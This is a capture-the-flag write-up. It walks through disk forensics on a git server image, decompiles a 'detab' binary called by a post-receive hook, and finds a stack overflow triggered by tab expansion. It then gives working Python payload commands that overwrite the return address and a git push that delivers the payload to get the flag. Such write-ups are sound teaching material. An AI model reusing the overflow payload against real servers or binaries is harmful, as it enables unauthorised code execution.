# identification

For this one, we are also provided with a hostname and a tarball containing a SSH private key and a `qcow2` image. Since the description mentioned developers and git repository, this will probably be helpful to access the repo later on...

```console
$ file developers.key
developers.key: OpenSSH private key
$ qemu-img info githost.qcow2
image: githost.qcow2
file format: qcow2
virtual size: 10 GiB (10737418240 bytes)
disk size: 2.36 GiB
cluster_size: 65536
Format specific information:
    compat: 1.1
    compression type: zlib
    lazy refcounts: false
    refcount bits: 16
    corrupt: false
```

Since we're not provided with the run command, I guessed that this would be a disk forensics start then since we couldn't infer the VM properties.

```console
# modprobe nbd max_part=8
# qemu-nbd --connect=/dev/nbd0 ./githost.qcow2
# fdisk /dev/nbd0 -l
Disk /dev/nbd0: 10 GiB, 10737418240 bytes, 20971520 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 62B0CFE7-BB10-47FE-B235-AD95F16E8072

Device      Start      End  Sectors Size Type
/dev/nbd0p1  2048     4095     2048   1M BIOS boot
/dev/nbd0p2  4096 20969471 20965376  10G Linux filesystem
# mount /dev/nbd0p2 /mnt/githost
# cd /mnt/githost
# ls -la
[...]
-rwxr-xr-x  1 root root 17400 Jan 14 15:41 detab
drwxr-xr-x  4 root root  4096 Oct 22 16:00 dev
drwxr-xr-x 90 root root  4096 Jan 14 15:49 etc
-rw-r--r--  1 root root     9 Jan 18 11:44 flag.txt
[...]
```

The `detab` binary and `flag.txt` file look interesting!

# analysis

## filesystem

We know that the flag will be under `/flag.txt` on the remote host. I searched for `detab` references in the files and found a reference in a `git` script. This circles back to the description. So far so good :)

```console
$ find /mnt/githost/ 2> /dev/null| xargs grep detab 2> /dev/null
./home/git/repositories/hashfunctions.git/hooks/post-receive:    with subprocess.Popen(["/detab"], stdin=subprocess.PIPE, stdout=subprocess.PIPE) as proc:
```

## script

Analyzing the script code, we see that upon commit, if the author name is not `Order of 0x20`, `detab` will be called with the new file as input and no other arguments.

## detab

Few functions in here:
- `main()`
- `vaccinate()`
- `print_flag()`

Checking the protections, we have a strong indicator that we will have to exploit an overflow in `vaccinate` to call `print_flag` since there are no stack canaries nor PIE flag for the binary #ctf6thsense ;)

```console
 $ checksec detab
[*] 'detab'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

In Binary Ninja after analysis, we have the following HLIL for `vaccinate` and know that the output buffer is at `char output_buf[0x200]  {Frame offset -220}`.

```c
004012a2  int32_t is_new_line = 1
004012a9  int32_t consecutive_tabs = 0
004012bc  int64_t rcx = 0x41
004012c1  size_t i
004012c1  uint64_t* rdi = &i
004012c4  for (; rcx != 0; rcx = rcx - 1)
004012c4      *rdi = 0
004012c4      rdi = rdi + 8
0040140a  int64_t rax_3
0040140a  while (true)
0040140a      char current_char = fgetc(fp: *stdin)
00401418      char output_buf[0x200]
00401418      if (current_char != 0xff && current_char != 0)
004012cc          if (is_new_line == 0)
004012d2              uint64_t saved_i = i
004012dd              i = saved_i + 1
004012e8              *(&output_buf + saved_i) = current_char
004012f4          else
004012f4              if (is_new_line == 1 && current_char == '\t')
00401334                  for (int64_t count_spaces = 0; count_spaces u< spaces_for_tab; count_spaces = count_spaces + 1)
0040130a                      uint64_t saved_i = i
00401315                      i = saved_i + 1
0040131c                      *(&output_buf + saved_i) = ' '
00401336                  consecutive_tabs = consecutive_tabs + 1
0040135b                  if (consecutive_tabs s> 7)
0040135b                      fwrite(buf: "please review your code!\n", size: 1, count: 0x19, fp: *stderr)
00401360                      rax_3 = 0xffffffff
00401365                      break
00401370              if (((is_new_line != 1 || (is_new_line == 1 && current_char != '\t')) && is_new_line == 1) && current_char != '\t')
00401376                  uint64_t saved_i = i
00401381                  i = saved_i + 1
0040138c                  *(&output_buf + saved_i) = current_char
00401393                  is_new_line = 0
0040139a                  consecutive_tabs = 0
004013a1          if (current_char == '\n')
004013a7              is_new_line = 1
004013b5          if (i != 0x200)
004013bb              continue
004013e1          else
004013e1              fwrite(buf: &output_buf, size: 1, count: i, fp: *stdout)
004013f0              fflush(fp: *stdout)
004013f5              i = 0
004013f5              continue
00401446      fwrite(buf: &output_buf, size: 1, count: i, fp: *stdout)
0040144b      rax_3 = 0
0040144b      break
00401451  return rax_3
```

We see that a character is read from `stdin` at `0x0040140a` until there is no more to read. There is also this `output_buffer` which is of `0x200` bytes and as such, there is a safe check at `0x004013b5` to ensure that there is no overwrite of it. Clever!

At `0x004012f4` we see that if a malicious `\t` is encountered, it will be replaced by spaces. The number of spaces is passed as an argument and is coming from the command line. Here, since no options are passed to `detab`, the value is `4` spaces for `1` tab. We also have a limit of `7` `\t` in a row from test at `0x0040135b`. In order to place the spaces, our counter in `output_buffer` is incremented by `1` for each space at `0x00401315`. Wait, say that again!?!

If we have already read `0x1fd` characters when we encounted a `\t`, the counter will be above `0x200` and the test in `004013b5` will fail (since checking for exactly `0x200` cycles :)). We got our overflow!

Not so fast! Looking at the stack layout, you will see that we have other variables that we're going to overwrite by overflowing `output_buffer`:

```c
int64_t count_spaces  {Frame offset -18}
int32_t consecutive_tabs  {Frame offset -10}
int32_t is_new_line  {Frame offset -c}
```

# exploitation

I spend quite some time here trying to get a good value in those variables during the overflow but since we cannot use `\x00` (the function would return), we cannot properly set those integers to the expected values. The issue is that messing with them, we end up in the case where the characters are not written back to `output_buffer` due to the checks at `0x004012cc`, `0x004012f4` and `0x00401370`. After loosing too much time, I went for an unclean option: using multiple new lines to be sure that this variable has a correct value.

```console
$ gdb ./detab
(gdb) b*0x401450
(gdb) r < <(python -c 'print "A"*509+"\n"+"\t"+"ABCDEFGHIJKLMNOPQ\n\n\n\n\n\n"+"AAAAAAAACDEGFHIJKLM"')
(gdb) c
Continuing.
Breakpoint 1, 0x0000401450 in ?? ()
[...]
$rsp   : 0x00007fffffffe318  →  0x4948464745444341 ("ACDEGFHI"?)
[...]
```

Just have to weaponize this with `read_flag()` address to retrieve it on the real target.

```console
$ python -c 'print "A"*509+"\n"+"\t"+"ABCDEFGHIJKLMNOPQ\n\n\n\n\n\n"+"AAAAAAA\xd6\x11\x40\x00"' | ./detab > file.pwn
```

Now that we have the file, let's look at the repository:

```console
$ GIT_SSH_COMMAND='ssh -i ./githost/developers.key -o IdentitiesOnly=yes' git clone ssh://git@tabnabbed.challenges.adversary.zone:23230/hashfunctions.git
[...]
$ ls -l hashfunctions
-rw-r--r--  1 milkmix  staff   382B Jan 26 12:33 h.py
```

Let's add our `file.pwn` and push it to the repository:

```console
$ git add file.pwn
$ git commit -am 'pwned'
$ GIT_SSH_COMMAND='ssh -i ./githost/developers.key -o IdentitiesOnly=yes' git push
[...]
remote: 040 == 32 == 0x20!
[...]
$ GIT_SSH_COMMAND='ssh -i ./githost/developers.key -o IdentitiesOnly=yes' git pull
[...]
 file.pwn | Bin 546 -> 576 bytes
[...]
$ cat file.pwn
[...]
CS{th3_0ne_4nd_0nly_gith00k}
[...]
```

Also enjoyed this one for the steps and scenario!
